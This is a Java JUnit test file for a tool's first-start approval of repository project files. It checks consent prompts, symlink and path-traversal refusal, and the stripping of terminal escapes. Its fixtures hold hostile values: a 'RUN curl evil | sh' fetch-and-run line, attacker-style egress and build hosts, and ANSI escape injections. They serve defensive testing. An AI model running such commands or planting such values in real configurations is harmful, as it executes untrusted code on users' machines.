package org.fuin.porelo.app;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFilePermissions;
import java.util.ArrayList;
import java.util.List;
import org.fuin.porelo.core.config.XdgPaths;
import org.fuin.porelo.ecosystem.api.Detection;
import org.fuin.porelo.ecosystem.api.Finding;
import org.fuin.porelo.testing.FakeCommandRunner;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/** What a first start may take from a repository: nothing without a person's yes to that text. */
class FirstStartTest {

    private static final String ORIGIN = "https://forge.example/acme/shop.git";

    @TempDir Path root;

    private final FakeCommandRunner runner = new FakeCommandRunner();

    private final StringWriter said = new StringWriter();

    private final List<String> questions = new ArrayList<>();

    private PoreloContext context;

    private Path checkout;

    private int detected;

    private EcosystemDetector detector;

    private static Finding tool(final String key, final String value, final String file) {
        return new Finding(
                Finding.Part.TOOLS, key, value, file, 1, Finding.Origin.CHECKOUT, false, "");
    }

    private static Finding host(final String name, final Finding.Origin origin) {
        return new Finding(
                Finding.Part.RULES, "host." + name, "yes", "pom.xml", 1, origin, false, "");
    }

    @BeforeEach
    void machine() throws Exception {
        context =
                new PoreloContext(
                        runner,
                        new PoreloPaths(XdgPaths.of(key -> null, root), root.resolve("bin")),
                        args -> 0,
                        key -> null);
        checkout = Files.createDirectories(root.resolve("work/shop")).toRealPath();
        runner.answering("--show-toplevel", checkout.toString());
        runner.answering("get-url origin", ORIGIN);
        detector = answering(tool("package.maven", "", "pom.xml"));
    }

    private EcosystemDetector answering(final Finding... findings) {
        return (plugin, directory, home) -> {
            detected++;
            return new Detection(List.of(findings), List.of());
        };
    }

    private void plugin() throws Exception {
        final Path plugin =
                Files.createDirectories(context.paths().ecosystemDirectories().getFirst())
                        .resolve("maven");
        Files.writeString(
                plugin, "#!/bin/sh\nprintf '{\"protocolVersion\":1,\"ecosystem\":\"maven\"}'\n");
        Files.setPosixFilePermissions(plugin, PosixFilePermissions.fromString("rwx------"));
    }

    private void curated(final String host) throws Exception {
        final Path own = Files.createDirectories(context.paths().xdg().data().resolve("egress"));
        Files.writeString(
                own.resolve("curated.yaml"),
                "name: curated\nlabel: Curated\ndomains:\n    - " + host + "\n");
    }

    private FirstStart firstStart() {
        return new FirstStart(context, detector);
    }

    private WorkOrigin.Choice atTerminal(final String answer) {
        return new FirstStartAtTerminal(firstStart(), new PrintWriter(said))
                .choose(
                        checkout,
                        new Offer(
                                question -> {
                                    questions.add(question);
                                    return answer;
                                },
                                false,
                                false,
                                new PrintWriter(said)),
                        "Start once at a terminal without --yes or --no-input to be asked.");
    }

    private WorkOrigin.Choice unattended() {
        return new FirstStartAtTerminal(firstStart(), new PrintWriter(said))
                .choose(
                        checkout,
                        null,
                        "Start once at a terminal without --yes or --no-input to be asked.");
    }

    @Test
    void aYesWritesTheFileWhereThePersonStandsCommitsNothingAndFindsTheProject() throws Exception {
        plugin();
        detector =
                answering(
                        tool("package.maven", "", "pom.xml"),
                        host("repo.example.org", Finding.Origin.YOURS));

        final WorkOrigin.Choice choice = atTerminal("y");

        assertThat(choice.project()).isEqualTo("shop-project");
        assertThat(choice.repository()).isEqualTo("shop");
        final Path file = checkout.resolve("project.yml");
        assertThat(file).exists();
        assertThat(Files.readString(file))
                .contains("name: \"shop-project\"", "upstream: \"" + ORIGIN + "\"", "maven");
        assertThat(said.toString()).contains("package.maven", "pom.xml", "repo.example.org");
        assertThat(said.toString())
                .as("a yes moves where the work goes, so the question says so")
                .contains("takes this repository from " + ORIGIN);
        assertThat(String.join("\n", runner.lines())).doesNotContain(" commit", " add ");
        assertThat(ProjectSource.resolve(context, "shop-project").outcome())
                .isEqualTo(ProjectSource.Outcome.RECORDED);
        assertThat(ProjectSource.resolve(context, "shop-project").file())
                .isEqualTo(context.paths().projects().defaultProjectFile("shop-project"));
    }

    @Test
    void aNoKeepsNothingAndTheNextStartAsksAgain() throws Exception {
        plugin();

        assertThat(atTerminal("n")).isNull();

        assertThat(checkout.resolve("project.yml")).doesNotExist();
        assertThat(context.paths().projects().projectApprovals()).doesNotExist();
        assertThat(ProjectSource.resolve(context, "shop-project").file()).isNull();
        assertThat(said.toString()).contains("nothing kept");
        assertThat(atTerminal("n")).isNull();
        assertThat(questions).hasSize(2);
    }

    @Test
    void nobodyToAskWritesNothingAndSaysWhatWasFoundAndHowToBeAsked() throws Exception {
        plugin();

        assertThat(unattended()).isNull();

        assertThat(checkout.resolve("project.yml")).doesNotExist();
        assertThat(questions).isEmpty();
        assertThat(said.toString())
                .contains("package.maven", "nothing written", "without --yes", "'default'");
    }

    @Test
    void noPluginGoesAsTodayAndSaysSo() {
        assertThat(atTerminal("y")).isNull();

        assertThat(detected).isZero();
        assertThat(questions).isEmpty();
        assertThat(said.toString()).contains("no build-tool plugin is installed");
        assertThat(checkout.resolve("project.yml")).doesNotExist();
    }

    @Test
    void nothingRecognizedGoesAsTodayAndSaysSo() throws Exception {
        plugin();
        detector = answering();

        assertThat(atTerminal("y")).isNull();

        assertThat(questions).isEmpty();
        assertThat(said.toString()).contains("recognized nothing");
    }

    @Test
    void aPluginThatFailsIsSaidApartFromOneThatRecognizedNothing() throws Exception {
        plugin();
        detector =
                (plugin, directory, home) -> {
                    throw new org.fuin.porelo.ecosystem.api.EcosystemException("broke");
                };

        assertThat(atTerminal("y")).isNull();

        assertThat(said.toString()).contains("maven failed to answer");
    }

    @Test
    void aRepositorysControlCharactersReachNoTerminal() throws Exception {
        plugin();
        detector =
                answering(
                        tool("tool.jdk", "21\u001b[2J", "evil\u001b]0;x\u0007.xml"),
                        new Finding(
                                Finding.Part.TOOLS,
                                "tool.ant",
                                "",
                                "b\u0085uild.xml",
                                1,
                                Finding.Origin.CHECKOUT,
                                true,
                                "see\u001b[31m parent"));

        atTerminal("n");

        assertThat(said.toString())
                .doesNotContain("\u001b", "\u0007", "\u0085")
                .contains("tool.jdk");
    }

    @Test
    void aPluginsUnusableHostIsNeitherWrittenNorRepeated() throws Exception {
        plugin();
        detector = answering(host("a\nb.example:token", Finding.Origin.CHECKOUT));

        assertThat(atTerminal("y")).isNull();

        assertThat(checkout.resolve("project.yml")).doesNotExist();
        assertThat(questions).isEmpty();
        assertThat(said.toString()).doesNotContain("token");
    }

    @Test
    void aHostOnlyTheCheckoutNamesOutsideACuratedSetIsMarkedAndDefaultsToNo() throws Exception {
        plugin();
        curated("repo.maven.apache.org");
        detector =
                answering(
                        host("repo.maven.apache.org", Finding.Origin.CHECKOUT),
                        host("nexus.evil.example", Finding.Origin.CHECKOUT));

        assertThat(atTerminal("")).as("an empty answer is a no here").isNull();

        assertThat(questions.getFirst()).endsWith("[y/N]");
        assertThat(said.toString())
                .contains("nexus.evil.example  <- only this repository names it")
                .doesNotContain("repo.maven.apache.org  <-");
        assertThat(checkout.resolve("project.yml")).doesNotExist();
        assertThat(firstStart().look(checkout).marked()).containsExactly("nexus.evil.example");
    }

    @Test
    void hostsInACuratedSetOrThePersonsOwnFilesDefaultToYes() throws Exception {
        plugin();
        curated("repo.maven.apache.org");
        detector =
                answering(
                        host("repo.maven.apache.org", Finding.Origin.CHECKOUT),
                        host("nexus.corp.example", Finding.Origin.YOURS));

        assertThat(atTerminal("")).isNotNull();

        assertThat(questions.getFirst()).endsWith("[Y/n]");
        assertThat(said.toString()).doesNotContain("<-");
    }

    @Test
    void anUnknownJdkIsSaidWithWhyAndItsParentAndAYesWritesTheFileWithoutIt() throws Exception {
        plugin();
        detector =
                answering(
                        new Finding(
                                Finding.Part.TOOLS,
                                "tool.jdk",
                                "",
                                "pom.xml",
                                4,
                                Finding.Origin.CHECKOUT,
                                true,
                                "set by its parent org.acme:parent:1, not in the local repository"));

        assertThat(atTerminal("y")).isNotNull();

        assertThat(said.toString())
                .contains("unknown  tool.jdk", "org.acme:parent:1", "without it");
        final String text = Files.readString(checkout.resolve("project.yml"));
        assertThat(text).doesNotContain("RUN ");
        assertThat(firstStart().look(checkout).outcome()).isEqualTo(FirstStart.Outcome.KNOWN);
    }

    @Test
    void aNameThatIsAnotherLocalProjectsIsRefusedAtTheQuestion() throws Exception {
        plugin();
        final Path written = context.paths().projects().defaultProjectFile("shop-project");
        Files.createDirectories(written.getParent());
        Files.writeString(
                written,
                "project:\n  name: shop-project\n  security_class: guarded\n"
                        + "image:\n  base_image: ubuntu:24.04\n");

        assertThat(atTerminal("y")).isNull();

        assertThat(questions).isEmpty();
        assertThat(checkout.resolve("project.yml")).doesNotExist();
        assertThat(said.toString()).contains("already has a project 'shop-project'");
    }

    @Test
    void theSecondStartFindsTheProjectWithNoQuestionAndNoPlugin() throws Exception {
        plugin();
        atTerminal("y");
        final int asked = detected;
        questions.clear();

        final WorkOrigin.Choice second = atTerminal("n");

        assertThat(second.project()).isEqualTo("shop-project");
        assertThat(second.repository()).isEqualTo("shop");
        assertThat(questions).isEmpty();
        assertThat(detected).isEqualTo(asked);
    }

    @Test
    void anotherCheckoutOfTheSameOriginFindsTheRecordedProject() throws Exception {
        plugin();
        atTerminal("y");
        checkout = Files.createDirectories(root.resolve("other/shop")).toRealPath();
        final int asked = detected;

        final WorkOrigin.Choice found = WorkOrigin.placedNaming(context, ORIGIN);

        assertThat(found.project()).isEqualTo("shop-project");
        assertThat(found.repository()).isEqualTo("shop");
        assertThat(detected).isEqualTo(asked);
    }

    @Test
    void anOrganizationsPlacedProjectStillComesFirst() throws Exception {
        plugin();
        atTerminal("y");
        PlacedFixture.place(
                context,
                "acme",
                "project:\n  name: acme\n  security_class: guarded\n"
                        + "image:\n  base_image: ubuntu:24.04\n"
                        + "repositories:\n  shop:\n    upstream: \""
                        + ORIGIN
                        + "\"\n");

        assertThat(WorkOrigin.placedNaming(context, ORIGIN).project()).isEqualTo("acme");
        final FirstStart.Answer answer = firstStart().look(checkout);
        assertThat(answer.outcome()).isEqualTo(FirstStart.Outcome.NOT_DEFAULT);
        assertThat(answer.project()).isEqualTo("acme");
    }

    @Test
    void aProjectYmlInAnOrganizationsCheckoutDecidesNothing() throws Exception {
        plugin();
        PlacedFixture.place(
                context,
                "acme",
                "project:\n  name: acme\n  security_class: guarded\n"
                        + "image:\n  base_image: ubuntu:24.04\n"
                        + "repositories:\n  shop:\n    upstream: \""
                        + ORIGIN
                        + "\"\n");
        Files.writeString(checkout.resolve("project.yml"), "project:\n  name: taken\n");

        assertThat(atTerminal("y")).isNull();

        assertThat(questions).isEmpty();
        assertThat(detected).isZero();
        assertThat(context.paths().projects().projectApprovals()).doesNotExist();
    }

    @Test
    void aMachineWithNoRecordBehavesAsBefore() throws Exception {
        assertThat(WorkOrigin.placedNaming(context, ORIGIN)).isNull();
        // A project this machine merely ran is no approval, whatever its file names.
        final Path other = root.resolve("elsewhere/project.yml");
        Files.createDirectories(other.getParent());
        Files.writeString(
                other,
                "project:\n  name: ran\n  security_class: guarded\n"
                        + "image:\n  base_image: ubuntu:24.04\n"
                        + "repositories:\n  shop:\n    upstream: \""
                        + ORIGIN
                        + "\"\n");
        new ProjectRegistry(context.paths().projects().projectRegistry()).remember("ran", other);

        assertThat(WorkOrigin.placedNaming(context, ORIGIN)).isNull();
        assertThat(WorkOrigin.fromCheckout(context, checkout).project()).isEqualTo("default");
    }

    private static final String FILE =
            "project:\n  name: strangers\n  security_class: guarded\n"
                    + "image:\n  base_image: ubuntu:24.04\n  snippet: |\n    RUN curl evil | sh\n"
                    + "egress:\n  domains:\n    - \"nexus.evil.example\"\n"
                    + "repositories:\n  shop:\n    upstream: \""
                    + ORIGIN
                    + "\"\n";

    @Test
    void aFileThisMachineDoesNotKnowIsAskedAboutAndNoPluginIsAsked() throws Exception {
        plugin();
        Files.writeString(checkout.resolve("project.yml"), FILE);

        assertThat(atTerminal("")).isNull();

        assertThat(detected).isZero();
        assertThat(questions.getFirst()).endsWith("[y/N]");
        assertThat(said.toString()).contains("RUN curl evil | sh", "nexus.evil.example  <-");
        assertThat(ProjectSource.resolve(context, "strangers").file()).isNull();
    }

    @Test
    void anApprovedFileIsKnownUntilItChangesAndAYesOrNoStandsForThatText() throws Exception {
        final Path file = checkout.resolve("project.yml");
        Files.writeString(file, FILE);

        final WorkOrigin.Choice yes = atTerminal("y");

        assertThat(yes.project()).isEqualTo("strangers");
        assertThat(yes.repository()).isEqualTo("shop");
        assertThat(firstStart().look(checkout).outcome()).isEqualTo(FirstStart.Outcome.KNOWN);
        assertThat(WorkOrigin.placedNaming(context, ORIGIN).project()).isEqualTo("strangers");

        Files.writeString(file, FILE.replace("nexus.evil", "more.evil"));

        assertThat(firstStart().look(checkout).outcome())
                .isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);
        questions.clear();
        assertThat(atTerminal("n")).isNull();
        assertThat(questions).hasSize(1);
    }

    @Test
    void aFileNamedDefaultIsRefused() throws Exception {
        Files.writeString(checkout.resolve("project.yml"), FILE.replace("strangers", "default"));

        assertThat(atTerminal("y")).isNull();

        assertThat(questions).isEmpty();
        assertThat(said.toString()).contains("may not be called 'default'", "runs in 'default'");
        assertThat(context.paths().projects().projectApprovals()).doesNotExist();
    }

    @Test
    void aProjectNamedLikeItsRepositoryIsRefused() throws Exception {
        Files.writeString(checkout.resolve("project.yml"), FILE.replace("strangers", "shop"));

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal()).isNotNull();
        // The reader refuses such a file, which is what makes it the file's own fault.
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
        assertThat(answer.refusal().detail()).contains("shop");
        assertThatThrownBy(() -> firstStart().confirm(checkout, answer.hash()))
                .isInstanceOf(FirstStart.Refused.class);
    }

    @Test
    void aLinkIsNoFileAndItsTargetIsNeverRead() throws Exception {
        final Path secret = Files.writeString(root.resolve("secret"), "password-fixture\n");
        Files.createSymbolicLink(checkout.resolve("project.yml"), secret);

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
        assertThat(answer.file()).isEmpty();
        assertThat(atTerminal("y")).isNull();
        assertThat(said.toString()).doesNotContain("password-fixture");
    }

    @Test
    void aFileThatDoesNotReadIsRefusedAndThePersonIsNotAsked() throws Exception {
        Files.writeString(checkout.resolve("project.yml"), "project: [\u001b[2J\n");

        assertThat(atTerminal("y")).isNull();

        assertThat(questions).isEmpty();
        assertThat(said.toString()).contains("does not read").doesNotContain("\u001b");
    }

    @Test
    void confirmingTakesTheHashAndRefusesOneThatNoLongerMatches() throws Exception {
        plugin();
        final FirstStart.Answer asked = firstStart().look(checkout);
        assertThat(asked.outcome()).isEqualTo(FirstStart.Outcome.ASK_NEW);

        assertThatThrownBy(() -> firstStart().confirm(checkout, "feed"))
                .isInstanceOfSatisfying(
                        FirstStart.Refused.class,
                        ex -> assertThat(ex.reason()).isEqualTo(FirstStart.Reason.MOVED_ON));
        assertThat(checkout.resolve("project.yml")).doesNotExist();

        assertThat(firstStart().confirm(checkout, asked.hash())).isEqualTo("shop-project");

        assertThat(Files.readString(checkout.resolve("project.yml"))).isEqualTo(asked.file());
        assertThat(firstStart().confirm(checkout, asked.hash())).isEqualTo("shop-project");
    }

    private static final String WITH_SNIPPET =
            "project:\n  name: strangers\n  security_class: guarded\n"
                    + "image:\n  base_image: ubuntu:24.04\n  snippet_file: image.inc\n"
                    + "repositories:\n  shop:\n    upstream: \""
                    + ORIGIN
                    + "\"\n";

    private Path withSnippet() throws Exception {
        Files.writeString(checkout.resolve("image.inc"), "RUN echo approved\n");
        return Files.writeString(checkout.resolve("project.yml"), WITH_SNIPPET);
    }

    private Path copy() {
        return context.paths().projects().defaultProjectFile("strangers");
    }

    @Test
    void aChangeInANamedFileAloneAsksAgain() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();

        Files.writeString(checkout.resolve("image.inc"), "RUN curl evil | sh\n");

        assertThat(firstStart().look(checkout).outcome())
                .isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);
    }

    @Test
    void theHashCoversEachNamedFileAndItsName() throws Exception {
        withSnippet();
        final String first = firstStart().look(checkout).hash();

        Files.writeString(checkout.resolve("image.inc"), "RUN echo other\n");
        final String changed = firstStart().look(checkout).hash();

        Files.writeString(checkout.resolve("image.inc"), "RUN echo approved\n");
        Files.move(checkout.resolve("image.inc"), checkout.resolve("other.inc"));
        Files.writeString(
                checkout.resolve("project.yml"), WITH_SNIPPET.replace("image.inc", "other.inc"));
        final String renamed = firstStart().look(checkout).hash();

        assertThat(List.of(first, changed, renamed)).doesNotHaveDuplicates();
    }

    @Test
    void whatStartsIsTheCopyWhateverTheCheckoutNowHolds() throws Exception {
        final Path file = withSnippet();
        assertThat(atTerminal("y")).isNotNull();

        Files.writeString(file, FILE.replace("strangers", "strangers"));
        Files.writeString(checkout.resolve("image.inc"), "RUN curl evil | sh\n");

        final Path started = ProjectSource.require(context, "strangers");
        assertThat(started).isEqualTo(copy());
        assertThat(Files.readString(started)).isEqualTo(WITH_SNIPPET);
        assertThat(org.fuin.porelo.core.project.ProjectReader.read(started).imageSnippetLines())
                .contains("RUN echo approved");
    }

    @Test
    void aChangeBetweenTheQuestionAndTheYesStartsWhatWasRead() throws Exception {
        final Path file = withSnippet();
        final FirstStart.Answer read = firstStart().look(checkout);
        Files.writeString(file, FILE);
        Files.writeString(checkout.resolve("image.inc"), "RUN curl evil | sh\n");

        assertThat(firstStart().take(read)).isEqualTo("strangers");

        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET);
        assertThat(Files.readString(copy().resolveSibling("image.inc")))
                .isEqualTo("RUN echo approved\n");
        assertThat(firstStart().look(checkout).outcome())
                .as("the checkout now differs from what was approved")
                .isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);
    }

    @Test
    void theCheckoutsPathIsNotRegistered() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();

        assertThat(new ProjectRegistry(context.paths().projects().projectRegistry()).all())
                .doesNotContainKey("strangers");
    }

    @Test
    void aNamedFileThatIsALinkIsRefused() throws Exception {
        withSnippet();
        final Path inside = Files.writeString(checkout.resolve("real.inc"), "RUN echo real\n");
        Files.delete(checkout.resolve("image.inc"));
        Files.createSymbolicLink(checkout.resolve("image.inc"), inside);

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal()).isNotNull();
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
    }

    @Test
    void aNamedFileBehindALinkedDirectoryIsRefused() throws Exception {
        withSnippet();
        final Path real = Files.createDirectories(checkout.resolve("real"));
        Files.writeString(real.resolve("image.inc"), "RUN echo real\n");
        Files.createSymbolicLink(checkout.resolve("linked"), real);
        Files.writeString(
                checkout.resolve("project.yml"),
                WITH_SNIPPET.replace("image.inc", "linked/image.inc"));

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal()).isNotNull();
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
    }

    @Test
    void aNamedFileOutsideTheCheckoutIsRefused() throws Exception {
        Files.writeString(checkout.resolveSibling("outside.inc"), "password-fixture\n");
        Files.writeString(
                checkout.resolve("project.yml"),
                WITH_SNIPPET.replace("image.inc", "../outside.inc"));

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal()).isNotNull();
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
        assertThat(answer.file()).doesNotContain("password-fixture");
    }

    @Test
    void aNamedFileOverTheLimitIsRefused() throws Exception {
        withSnippet();
        Files.write(checkout.resolve("image.inc"), new byte[1024 * 1024 + 1]);

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal()).isNotNull();
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
    }

    @Test
    void aNewFileGoesIntoTheCheckoutAndTheCopyIsWhatStarts() throws Exception {
        plugin();
        assertThat(atTerminal("y")).isNotNull();
        final Path file = checkout.resolve("project.yml");
        final String written = Files.readString(file);

        Files.writeString(file, written + "# touched\n");

        final Path started = ProjectSource.require(context, "shop-project");
        assertThat(started)
                .isEqualTo(context.paths().projects().defaultProjectFile("shop-project"));
        assertThat(Files.readString(started)).isEqualTo(written);
    }

    @Test
    void aYesToAChangedFileReplacesTheCopyAndItsOwnNameIsNotTaken() throws Exception {
        final Path file = withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        Files.writeString(file, WITH_SNIPPET + "# changed\n");

        final FirstStart.Answer asked = firstStart().look(checkout);

        assertThat(asked.refusal()).isNull();
        assertThat(firstStart().take(asked)).isEqualTo("strangers");
        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET + "# changed\n");
        assertThat(firstStart().look(checkout).outcome()).isEqualTo(FirstStart.Outcome.KNOWN);
    }

    @Test
    void aSecondCheckoutOfTheIdenticalFileIsTheSameProject() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        final Path second = Files.createDirectories(root.resolve("second/shop")).toRealPath();
        runner.answering("--show-toplevel", second.toString());
        Files.writeString(second.resolve("image.inc"), "RUN echo approved\n");
        Files.writeString(second.resolve("project.yml"), WITH_SNIPPET);

        final FirstStart.Answer answer = firstStart().look(second);

        assertThat(answer.outcome()).isEqualTo(FirstStart.Outcome.KNOWN);
        assertThat(answer.project()).isEqualTo("strangers");
    }

    private Path secondCheckout(final String origin) throws Exception {
        final Path second = Files.createDirectories(root.resolve("second/shop")).toRealPath();
        runner.answering("--show-toplevel", second.toString());
        runner.answering("get-url origin", origin);
        Files.writeString(second.resolve("image.inc"), "RUN echo approved\n");
        Files.writeString(second.resolve("project.yml"), WITH_SNIPPET);
        checkout = second;
        return second;
    }

    @Test
    void aSecondCloneOfTheSameOriginAndFileAsksNothingAndStartsFromTheCopy() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        secondCheckout(ORIGIN);
        questions.clear();

        final WorkOrigin.Choice choice = atTerminal("n");

        assertThat(questions).isEmpty();
        assertThat(choice.project()).isEqualTo("strangers");
        assertThat(ProjectSource.require(context, "strangers")).isEqualTo(copy());
    }

    @Test
    void theSameFileWithAnotherOriginIsRefusedAndGoesToDefaultSayingSo() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        secondCheckout("https://forge.example/stranger/thing.git");
        questions.clear();

        assertThat(firstStart().look(checkout).refusal().reason())
                .isEqualTo(FirstStart.Reason.NAME_TAKEN);
        assertThat(atTerminal("y")).isNull();

        assertThat(questions).isEmpty();
        assertThat(said.toString()).contains("already has a project 'strangers'", "'default'");
        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET);
    }

    @Test
    void aSecondCheckoutWithNoOriginIsNotTheSameProject() throws Exception {
        runner.failing("get-url origin", 2, "no such remote");
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        final Path second = Files.createDirectories(root.resolve("second/shop")).toRealPath();
        runner.answering("--show-toplevel", second.toString());
        Files.writeString(second.resolve("image.inc"), "RUN echo approved\n");
        Files.writeString(second.resolve("project.yml"), WITH_SNIPPET);

        final FirstStart.Answer answer = firstStart().look(second);

        assertThat(answer.outcome()).isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.NAME_TAKEN);
        answer.discard();
    }

    @Test
    void theSameOriginWithAChangedFileAsksAgainAndAYesReplacesTheCopy() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        final Path second = secondCheckout(ORIGIN);
        Files.writeString(second.resolve("image.inc"), "RUN echo changed\n");
        questions.clear();

        assertThat(atTerminal("y")).isNotNull();

        assertThat(questions).hasSize(1);
        assertThat(Files.readString(copy().resolveSibling("image.inc")))
                .isEqualTo("RUN echo changed\n");
    }

    @Test
    void aGitWorktreeOfTheSameRepositoryIsTheSameProject() throws Exception {
        // Real git: in a worktree .git is a file, and the origin has to be read through it.
        final var git = new org.fuin.porelo.core.process.ProcessCommandRunner();
        final java.util.Map<String, String> clean =
                java.util.Map.of("GIT_CONFIG_GLOBAL", "/dev/null", "GIT_CONFIG_NOSYSTEM", "1");
        context =
                new PoreloContext(
                        command -> git.run(command.withEnvironment(clean)),
                        context.paths(),
                        args -> 0,
                        key -> null);
        final java.util.function.BiConsumer<Path, List<String>> inGit =
                (where, arguments) -> {
                    final List<String> all =
                            new ArrayList<>(
                                    List.of(
                                            "git",
                                            "-c",
                                            "user.name=T",
                                            "-c",
                                            "user.email=t@example.org"));
                    all.addAll(arguments);
                    git.runOrFail(
                            org.fuin.porelo.core.process.Command.of(all)
                                    .in(where)
                                    .withEnvironment(clean));
                };
        inGit.accept(checkout, List.of("init", "-q"));
        inGit.accept(checkout, List.of("remote", "add", "origin", ORIGIN));
        withSnippet();
        inGit.accept(checkout, List.of("add", "project.yml", "image.inc"));
        inGit.accept(checkout, List.of("commit", "-q", "-m", "first"));
        assertThat(atTerminal("y")).isNotNull();
        final Path worktree = root.resolve("worktree");
        inGit.accept(checkout, List.of("worktree", "add", "-q", worktree.toString()));
        assertThat(worktree.resolve(".git")).isRegularFile();
        questions.clear();
        checkout = worktree.toRealPath();

        final WorkOrigin.Choice choice = atTerminal("n");

        assertThat(questions).isEmpty();
        assertThat(choice.project()).isEqualTo("strangers");
        assertThat(choice.repository()).isEqualTo("shop");
    }

    @Test
    void aSecondCheckoutWithOtherContentUnderThatNameIsTakenAndTheCopyStays() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        final Path second = Files.createDirectories(root.resolve("attacker")).toRealPath();
        runner.answering("--show-toplevel", second.toString());
        runner.answering("get-url origin", "https://forge.example/other/thing.git");
        Files.writeString(second.resolve("project.yml"), FILE);

        final FirstStart.Answer answer = firstStart().look(second);

        assertThat(answer.refusal()).isNotNull();
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.NAME_TAKEN);
        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET);
    }

    private static final String WHOLE =
            "project:\n  name: strangers\n  security_class: online\n"
                    + "  upstream: \"https://forge.example/acme/own.git\"\n"
                    + "image:\n  base_image: ubuntu:24.04\n  snippet_file: image.inc\n"
                    + "mail:\n  rules:\n    others: allow\n  outgoing_filter: reporting\n"
                    + "builds:\n  forge: github\n  credential: stolen-entry\n"
                    + "  api: \"https://builds.evil.example\"\n";

    @Test
    void theQuestionShowsTheWholeFileAndItsNamedFiles() throws Exception {
        Files.writeString(checkout.resolve("image.inc"), "RUN echo \u001b[2Jhidden\n");
        Files.writeString(checkout.resolve("project.yml"), WHOLE);

        assertThat(firstStart().look(checkout).refusal()).isNull();
        atTerminal("n");

        assertThat(said.toString())
                .contains(
                        "others: allow",
                        "outgoing_filter",
                        "credential: stolen-entry",
                        "builds.evil.example",
                        "image.inc",
                        "hidden")
                .doesNotContain("\u001b");
    }

    @Test
    void theAnswersFileCarriesTheNamedFilesToo() throws Exception {
        withSnippet();

        assertThat(firstStart().look(checkout).file())
                .contains(WITH_SNIPPET.strip(), "image.inc", "RUN echo approved");
    }

    @Test
    void aNewFileThatIsOnlineSaysSoAndHoldsNoMailOrBuilds() throws Exception {
        plugin();
        runner.answering("get-url origin", "http://127.0.0.1:3000/acme/shop.git");

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.file()).contains("security_class: online");
        assertThat(answer.file()).doesNotContain("\nmail:", "\nbuilds:", "\ncredentials:");
        assertThat(answer.found()).extracting(FirstStart.Found::what).contains("security class");
    }

    @Test
    void theNameIsCheckedAgainAtTheYesWithTwoQuestionsOpen() throws Exception {
        withSnippet();
        final Path second = Files.createDirectories(root.resolve("attacker")).toRealPath();
        Files.writeString(second.resolve("project.yml"), FILE);
        final FirstStart.Answer first = firstStart().look(checkout);
        runner.answering("--show-toplevel", second.toString());
        runner.answering("get-url origin", "https://forge.example/other/thing.git");
        final FirstStart.Answer other = firstStart().look(second);

        assertThat(firstStart().take(first)).isEqualTo("strangers");

        assertThatThrownBy(() -> firstStart().take(other))
                .isInstanceOfSatisfying(
                        FirstStart.Refused.class,
                        ex -> assertThat(ex.reason()).isEqualTo(FirstStart.Reason.NAME_TAKEN));
        assertThat(ProjectSource.require(context, "strangers")).isEqualTo(copy());
        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET);
    }

    @Test
    void aNoLeavesNoStagedCopyOnThisMachine() throws Exception {
        withSnippet();
        assertThat(atTerminal("n")).isNull();

        final Path projects = context.paths().xdg().config().resolve("projects");
        if (Files.isDirectory(projects)) {
            try (var left = Files.list(projects)) {
                assertThat(left.toList()).isEmpty();
            }
        }
        assertThat(context.paths().projects().projectApprovals()).doesNotExist();
    }

    @Test
    void aDirectoryInNoCheckoutIsRefusedAsANamedValue() {
        runner.failing("--show-toplevel", 128, "not a git repository");

        assertThatThrownBy(() -> firstStart().look(checkout))
                .isInstanceOfSatisfying(
                        FirstStart.Refused.class,
                        ex -> assertThat(ex.reason()).isEqualTo(FirstStart.Reason.NOT_A_CHECKOUT));
    }
}
